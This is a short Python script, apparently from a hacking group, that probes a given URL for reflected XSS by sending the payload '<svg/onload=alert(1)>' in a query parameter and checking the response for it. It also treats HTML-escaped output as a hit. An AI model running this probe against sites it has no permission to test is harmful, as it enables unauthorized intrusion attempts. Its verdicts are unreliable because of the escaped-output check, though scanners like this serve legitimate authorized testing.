#!/usr/bin/env python3
# TBH-XSS - Reflected XSS Checker (Educational - Only Authorized)
import requests, argparse, json, urllib.parse

BANNER = """\033[91m╔════════════════════════════════════╗
\033[91m║ \033[97mTBH-XSS \033[91m- Detector                \033[91m║
\033[91m║ \033[90mTulungagung Black Hat | uchil404 \033[91m║
\033[91m╚════════════════════════════════════╝\033[0m"""

PAYLOAD = "<svg/onload=alert(1)>"

def check(url):
    # Try inject payload as q param
    parsed=urllib.parse.urlparse(url)
    qs=urllib.parse.parse_qs(parsed.query)
    test_url=url
    if not qs:
        test_url=f"{url}?q={urllib.parse.quote(PAYLOAD)}"
    else:
        # Replace first param value
        k=list(qs.keys())[0]
        qs[k]=PAYLOAD
        test_url=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)))
    try:
        r=requests.get(test_url,timeout=5,headers={'User-Agent':'TBH-XSS/1.0'})
        reflected=PAYLOAD in r.text or urllib.parse.quote(PAYLOAD) in r.text or "&lt;svg" in r.text
        return {"url":test_url,"status":r.status_code,"reflected":reflected,"length":len(r.text)}
    except Exception as e:
        return {"url":test_url,"error":str(e),"reflected":False}

def main():
    print(BANNER)
    print("\033[91m[!] Hanya untuk scope yang diizinkan! Test XSS dengan payload aman.\033[0m\n")
    parser=argparse.ArgumentParser(description="XSS Detector")
    parser.add_argument("-u","--url",required=True)
    parser.add_argument("--json",help="Save JSON")
    args=parser.parse_args()
    print(f"[*] Testing {args.url} dengan payload: {PAYLOAD}")
    result=check(args.url)
    if result.get("reflected"):
        print(f"\033[91m[!] Reflected! {result['url']} -> {result['status']} - Potensi XSS, cek manual!\033[0m")
    else:
        print(f"\033[92m[✓] Tidak reflected [{result.get('status')}] - mungkin aman / butuh bypass\033[0m")
    if args.json:
        open(args.json,'w').write(json.dumps(result,indent=2)); print(f"[✓] JSON: {args.json}")

if __name__=="__main__": main()
